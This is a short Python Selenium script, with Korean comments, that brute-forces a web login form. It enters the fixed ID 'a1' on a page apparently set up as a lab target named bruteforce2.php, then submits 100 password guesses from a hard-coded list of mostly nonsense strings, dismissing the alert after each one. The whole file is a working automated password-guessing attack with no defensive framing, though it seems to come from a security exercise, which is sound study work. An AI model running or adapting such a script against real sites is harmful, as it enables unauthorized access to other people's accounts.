
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
import time


driver = webdriver.Chrome(ChromeDriverManager().install())
da = Alert(driver)
#로그인 입역
driver.get('http://woosuk.izerone.co.kr:8090/~s120180366/bruteforce2.php')

list=["password","ehrd","adfaagfggggr","dbwuirvnflfskf","as","dnjl",
      "qd jask","pard","ehrd","adfaaaasggcagbr","dirvnflfvnfjskf","s","njl",
      "qd sk","pswrd","ehrd","adfaaaascgbr","dbwuirvnnfjskf","atyjyfhs","sajl",
      "qd jask","psword","ehrd","adascagbr","dbwuvnflfvnfjskf","s","dnjl",
      "qd jask","srd","ehrd","adfaascagbr","dbwuilfkf","as","snjl",
      " jask","paword","ehrd","adfaascagbr","dbwuirvnnfjskf","as","sjl",
      "qd jask","paword","ehrd","faaaascagbr","dbwuirvnflfjskf","as","sadnjl",
      "qdask","paword","ehrd","adfaaagbr","dbwuirvnflfvnfjskf","a","sadnjl",
      "qd jask","asword","ehrd","adfascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "q jask","pasword","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qd jask","ssword","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "d jask","password","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qd jask","psword","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qask","pasord","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qd jask","pasword","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "d jask","paword","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qd jask","paword","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "q sk","passrd","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qd jask","password","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qd jask","password","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "q ask","password","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qdjask","password","ehrd","adfaaaascagbr","dbwuirvnflfvnfjskf","as","sadnjl",
      "qdsk"]


#아이디 비밀번호 입력

id = driver.find_element_by_name('id')
id.send_keys("a1")
for i in range(100):
    pw = driver.find_element_by_name('pass')
    pw.send_keys(list[i])
    pw.submit()
    da.accept()


